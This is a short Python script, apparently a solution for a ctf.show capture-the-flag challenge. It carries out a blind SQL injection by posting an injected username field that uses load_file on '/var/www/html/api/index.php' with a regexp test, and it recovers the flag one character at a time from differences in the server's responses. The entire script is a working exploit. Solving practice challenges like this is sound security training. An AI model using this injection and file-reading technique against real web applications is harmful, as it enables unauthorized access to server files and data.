from requests import post
from string import digits, ascii_lowercase

url = 'http://3036b032-5bb6-4115-b349-caeaa9c93367.challenge.ctf.show//api/'
payload = "if(load_file('/var/www/html/api/index.php')regexp'{}',0,1)"
flag = 'ctfshow{'

while True:
    for c in '-}' + digits + ascii_lowercase:
        res = post(url, {'username': payload.format(flag + c), 'password': '0'}).text
        if '8bef' in res:
            flag += c
            print(flag)
            if c == '}':
                exit()